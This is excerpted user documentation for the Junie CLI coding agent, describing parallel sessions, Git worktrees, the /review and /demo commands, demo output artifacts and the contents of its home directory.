Junie can keep multiple live sessions in one interactive terminal. You can start another task, let existing
sessions continue in the background, and switch back to them later without losing their scrollback or current state.

Parallel sessions share the file system of the project or worktree they are running in. When you want several sessions
to make code changes at the same time, use [Git worktrees](https://git-scm.com/docs/git-worktree) so each task works in
its own checkout.

## Start another session

Use `/new` when you want to start another task without quitting the current Junie instance. The current session stays
live in the background, and Junie opens a new interactive session.
...
Run `/history` to open **Task history**. It lists live sessions from the current Junie instance together with saved
sessions from previous runs. Start typing to search the list, select a row to open that session, or press `Esc` to return
to the current session.

By default, Task history shows sessions from **all directories**. Press `Tab` to narrow the list down to **project
directory**, showing only sessions whose stored project directory matches the current project; press `Tab` again to
go back to all directories. The active scope is shown next to the "Task history" title, and the text search box
keeps filtering on top of whichever scope is active.

Task history shows the task name, project, and status or last activity time.

| Status | Meaning |
|--------|---------|
| `Working…` | The live session is currently running a task. |
| `Awaiting input` | The live session is waiting for your reply, approval, or another interactive choice. |
| `Ready` | The live session is idle and ready to continue. |
| Relative time, such as `5m ago` | The row is a saved session that is not currently live in this Junie instance. |
{width="706"}

Switching to a live session does not restart it. Junie brings that session to the foreground with its existing
conversation and terminal output preserved.

### Cross-process sessions

Task history can also show live sessions that are open in another Junie instance. These rows are dimmed and cannot
be opened from the current instance.

To continue one of those sessions, switch to the terminal where that Junie instance is running. This prevents two
terminal UIs from controlling the same live session at the same time.

## Use worktrees to isolate file changes

Parallel sessions do not isolate files by themselves. If two sessions work in the same project directory, they can edit
the same files and overwrite each other's changes. For simultaneous code changes, give each task its own Git worktree.

A Git worktree is a linked checkout of the same repository in a separate directory. Each worktree has its own working
tree and index, so different branches can be checked out simultaneously.
...
- **Create a new worktree**: Junie creates a new Git worktree with a predefined name, such as
  `<project>-junie-wt-01`, `<project>-junie-wt-02`, and so on, as a sibling directory of your project.
- **Switch back to the original project**: return to the main working directory.

After switching, Junie resets the current session state for the new worktree. Use `/worktree` before starting a new
task or at the beginning of a new live session.
...
If the current working directory has uncommitted changes when you create a new worktree, Junie asks whether to move
them to the target workspace or start clean:

- **Transfer changes to workspace**: Junie uses `git stash` to move uncommitted changes from the source directory to
  the target worktree.
- **Start with a clean workspace**: the target worktree starts with no uncommitted changes.

If the stash cannot be applied cleanly, for example because of conflicts, Junie reports the issue and leaves the
...
- Worktree directories are created as siblings of the project directory, for example `../my-project-junie-wt-01`. Make
  sure the parent directory is writable.
...
When you invoke the `/review` slash command without an argument, Junie CLI detects the Git state of your project and opens a wizard with available review targets:

- **Changes compared to main**: compares your current branch against `main`. Shown only when a `main` branch exists and you are not currently on it.
- **Last commit**: reviews the changes introduced in the most recent commit.
- **Staged changes**: reviews what you have added to the index. Shown only when the index is not empty.
- **Unstaged changes**: reviews the code you have modified but not yet committed.

The wizard also has a text field below the list for any other target, so the offered options are a shortcut rather than a limit.

![](review_wizard.png){width="706" border-effect="line"}

### Specific revisions

You can name a commit, a branch to compare the current branch against, a revision range, or how many of the most
recent commits to review right after the command:

```console
/review a1b2c3d
/review release
/review origin/main..HEAD
/review the last 2 commits
```

Junie CLI asks a lightweight model to work out the target from your text and starts the review without showing the
wizard. Staged and unstaged changes can be named the same way, for example `/review my staged changes`. If the
target is unclear, Junie CLI asks you to pick one or type a target.
...
```console
/review check the error handling in the new parser
```
...
The `/demo` command asks Junie CLI to build and launch your app in a disposable
VM, then interact with its UI to demonstrate a feature or change. It produces
a Markdown answer, screenshots, a screen recording, and an
[HTML report](#output-artifacts).
...
* **Docker running on your machine.** This is the most important prerequisite —
  ...
  Junie checks this before a run starts and tells you right away rather than
  failing halfway through, on every path that can launch a demo.
* **Access to a model with Computer Use support.** **GPT‑5.6 SOL, GPT‑6 Astra,
  GPT‑5.5, and GPT‑5.4** are supported. If your active model is supported and
  available, `/demo` keeps it. Otherwise, it picks the first available model
  in that order, preferring GPT‑5.6 SOL. If none are available, `/demo`
  refuses to start and shows the supported list. See
...
* **A demo VM image** at `.junie/vms/<name>/Dockerfile`, layered on top of
  ...
  When `/demo` runs in a project that has no VM template, Junie seeds a
  starter one for you — see [First-run setup](#first-run-setup).
...
starter versions for you (see [First-run setup](#first-run-setup)).
...
Junie asks **what you would like it to demo** and offers a short list of scopes
to choose from, with a text field right below it for
[describing the demo yourself](#describing-the-demo-yourself) (navigate with
the arrow keys, <kbd>Enter</kbd> to pick, <kbd>Esc</kbd> to cancel):

* **Changes of this branch (vs `origin/main`)** — everything the current
  branch adds on top of the default branch, including changes you haven't
  committed yet. The ref in the label is the default branch Junie resolved
  for your repository (`origin/main`, `origin/master`, `main`, or `master`).
* **Changes from this session** — the messages you exchanged, the files Junie
  touched, the task it just finished. You don't have to repeat what was done;
  the demo agent already sees it.
* **Uncommitted changes** — your working tree compared to `HEAD`. Files that
  aren't tracked by git yet are picked up too.
* **Last commit** — the last commit compared to its parent.
* **Smoke test — find anything broken** — Junie drives the app's main flows
  looking for breakage and reports what works and what doesn't.

The list adapts to your project: the branch scope only shows up when you're
not on the default branch, **Uncommitted changes** only when the working tree
is dirty, **Last commit** only when there is a commit to compare against.
Outside a git repository (or when git isn't installed) you get the session
scope and the smoke test.

For the three git scopes the **diff is the specification of the demo**: Junie
reads it first, lists every user-visible change in it, and demonstrates them
one by one instead of stopping at the first one. This is the most common way
to use `/demo`: you've just had Junie implement or fix something, and you
want to *see* it working before you commit — type `/demo`, hit
<kbd>Enter</kbd>, and pick the scope that matches what you want to see.

### Describing the demo yourself

None of the scopes has to fit: the picker always has a free‑form field below
the list. Press <kbd>↓</kbd> past the last scope to get into it (or type the
request right after `/demo` to land in it directly), and type what you want to
see in plain natural language:
...
<kbd>Enter</kbd> starts the run, <kbd>↑</kbd> takes you back to the list of
scopes, <kbd>Esc</kbd> cancels. The request is passed to the demo agent
verbatim, so the more concrete it is, the tighter the demo. Such a request is
treated as self‑contained — Junie won't go hunting through git history to find
unrelated context.

### Demoing a specific feature from scratch

When you want a demo of an existing feature (not a recent change), name the
feature explicitly in the same text field:

```text
the file-tree drag-and-drop in the sidebar
```

Junie will resolve how to reach it (menu item, hotkey, URL, etc.) and walk
through it.
...
When the run is scoped to a diff — one of the git scopes of the picker, or a
review-style request — Junie reads that diff before planning and turns every
user-visible change in it into a milestone, so the plan covers the whole
change set.
...
* Asking to continue or retry starts a new independent attempt with a new
  recording.

## Output artifacts

Junie CLI saves each run in a separate directory under Junie home:

```text
~/.junie/sessions/<session-id>/demo/<run-id>/
├── screenshots/
...
Retries do not overwrite earlier runs. Each report covers only its own run.

* **`report.html`**: the request, Markdown answer, embedded video, and screenshots.
* **`demo.mp4`**: the screen recording with captions burned into the frame, so
  they stay visible wherever the file is played or shared, if the recorder
  started and stopped cleanly.
* **`demo-original.mp4`**: the recording as captured, without captions. Present
  only when captions were burned in.
* **`captions.vtt`**: the same captions as a WebVTT track, based on screenshot
  timestamps.
* **`screenshots/`**: PNG screenshots captured by Computer Use.

Share the entire run directory so the report's relative links work.
The Markdown answer is also in the session transcript, not in a separate artifact file.

Artifacts are not deleted automatically. To remove them, delete the session
directory under `~/.junie/sessions/`.
...
* A health check Junie can wait on before interacting with the UI, e.g.
  `# ready when http://localhost:3000 responds 200`.
* A preflight check for services you run on the host yourself — inside the
  VM your host machine is reachable as `host.docker.internal`, so a line like
  `curl -sf http://host.docker.internal:9400/health` lets the demo fail fast
  when the backend isn't up.
* Test users the agent may log in with, and known quirks it should avoid.
  Never put secret values in `demo.md` — the file is committed; pass secrets
  to the VM through the template's `mounts` file instead.
...
Before every run, `/demo` checks that your project has both halves of a
working configuration:

* a VM template — some `.junie/vms/<name>/Dockerfile`, and
* a launch command in `.junie/demo.md`.

If either is missing, the run won't start a real demo. Instead, Junie
creates whatever isn't there yet and asks how you want to proceed. This is
not a one-shot: a `demo.md` that was seeded and never touched counts as no
setup at all, so the prompt keeps coming back until you edit the file.
Junie never rewrites a file that already exists.
...
* **Yes, fill them in for me** — Junie inspects your project (package
  manager, dev/start command, port, runtime version requirements, backing
  services, login walls, required tokens), asks you to confirm the resulting
  plan, and only then fills in `demo.md` and the `Dockerfile` — plus a
  `mounts` line when a host-side credential has to reach the VM. Review what
  it wrote, then re-run `/demo`.
...
Junie edits only `demo.md`, the VM `Dockerfile`, and — when a host credential
must reach the VM — the template's `mounts` file, and leaves the final review
and the real demo run to you.

### After editing

Once both files are filled in, re-run `/demo`. Junie will pick up the VM
template and start a real demo run. From then on your configuration is
treated as authoritative and Junie leaves it alone — the check is simply
whether `demo.md` still looks exactly like the file that was seeded. Edit
it in any way and it is yours; Junie stops asking and never second-guesses
what you wrote.

To go through the setup again, either ask Junie to "set up `/demo`", or
clear the configuration and re-run `/demo`: emptying `.junie/demo.md`
brings back the prompt while keeping your VM template, and deleting both
`.junie/vms/` and `.junie/demo.md` reseeds them from scratch.
...
Junie picks up the change, opens the search box, types several characters,
and shows that focus stays.
...
: None of the supported models are available for your account:
GPT‑5.6 SOL, GPT‑6 Astra, GPT‑5.5, or GPT‑5.4. Check model availability via
[Junie CLI Model selection](Junie-CLI-Model-selection.md).
...
Describe the entry path yourself in the request field, for example
`open Settings via Cmd+, and toggle X`.
...
- `log-<yyyy-MM-dd_HHmmss>-pid-<pid>.log` — process log for one CLI run
- `llm-streaming-<yyyy-MM-dd_HHmmss>-pid-<pid>.log` — LLM streaming payloads
- `junie-acp-<yyyy-MM-dd_HHmmss>-pid-<pid>.log` — ACP JSON-RPC wire traffic (IN/OUT). Development builds only: created when `--acp-logging=true` is passed, or when `/acp-logging start` is used
...
- `sessions/index.jsonl` — session index for CLI resume/listing, one JSON record per line (`sessionId`, timestamps, `taskName`, `projectDir`)
- `sessions/<sessionId>/summary.json` — display snapshot for Junie Live (`sessionId`, timestamps, `taskName`, `lifecycle`, `projectDir`, and a compact `subagents` snapshot of `{id, name, status, parentId, role, modelUsage}` when any subagents have spawned)
- `sessions/<sessionId>/conversation-summary.md` — compacted conversation summary text written after chat history compression; used by Junie Live session sync
- `sessions/<sessionId>/events.jsonl` — session event stream
- `sessions/<sessionId>/state.json` — latest saved agent state
- `sessions/<sessionId>/checkpoints/<sha256(responseId)>.json` — fork checkpoint published after a completed agent
  response: the response id, the `sha256:` fingerprint of the response text as sent over ACP, the `events.jsonl` byte
  length at that moment and the exact agent state that followed the response (as it is written to `state.json`); the
  file is named by a digest because the id arrives from the ACP client; the task folders a fork needs are derived from
  the `events.jsonl` prefix
...
- a session exists for CLI listing and Junie Live sync only when it has a row in `index.jsonl`; `summary.json` overlays display fields and does not create a session on its own
- CLI writes `summary.json` for Junie Live and does not read it; resume, listing, and branch lookup use `index.jsonl`
- the index and events are used to restore the history and state of interactive sessions
- `/branch` in the CLI and `session/fork` over ACP duplicate the whole `sessions/<sessionId>/` directory under a new
  session id and add an index record for it, so a branch is an ordinary, self-contained session directory and the
  original is left untouched; a `session/fork` at a specific response copies only what its checkpoint names: the
  `events.jsonl` prefix up to the checkpoint offset, the checkpoint state as `state.json`, the referenced task folders,
  and the earlier checkpoints — staged and moved into place in one step. A response without a checkpoint cannot be
  forked exactly and is rejected
...
- `state.json` and `summary.json` — JSON
- `conversation-summary.md` — markdown text
- `<taskId>/terminal-output/` — text files

### `acp-prompt-attachments/`

Temporary files materialized from inline ACP images and blob resources.

Structure:

- `acp-prompt-attachments/.root.lock` — coordinates cleanup and run creation between ACP processes
- `acp-prompt-attachments/<runId>/.lock` — exclusive lock held while that ACP process is running
- `acp-prompt-attachments/<runId>/<sessionId>/` — materialized files owned by one ACP session

Closing an ACP session deletes its session directory immediately. Graceful ACP process shutdown also deletes the process's
UUID-named run directory. A hard process termination releases the run lock through the operating system; the next ACP
startup deletes that unlocked run directory, as well as legacy session directories created directly under
`acp-prompt-attachments/`. Startup never deletes a run directory locked by another live ACP process, and cleanup does not
follow symbolic links.

Cleanup and storage-preparation failures are logged instead of preventing ACP startup. Text-only prompts remain available
when attachment storage cannot be prepared, while inline image and blob materialization is rejected. Junie does not impose
ACP-specific attachment size, count, or aggregate limits when materializing these files.
...
### `sandbox.json` and `sandbox-runtime/`

`sandbox.json` is the user-editable sandbox policy. `sandbox-runtime/` holds generated session settings passed to `srt`; sandboxed commands are explicitly denied writes to both locations, and generated files are removed when the owning project scope closes.
...
- `~/.junie/settings.json`
- `~/.junie/sessions/`
- `~/.junie/acp-prompt-attachments/` — temporary inline ACP images and blob resources
- `~/.junie/logs/`
- `~/.junie/trust/`
- `~/.junie/sandbox.json`
- `~/.junie/sandbox-runtime/` — generated sandbox settings
- `~/.junie/misc/`
- `~/.junie/mcp/mcp.json`
- `~/.junie/models/`
- `~/.junie/agent-skills/`
...
- the temporary contents of `acp-prompt-attachments/`, because they contain client-supplied prompt attachments
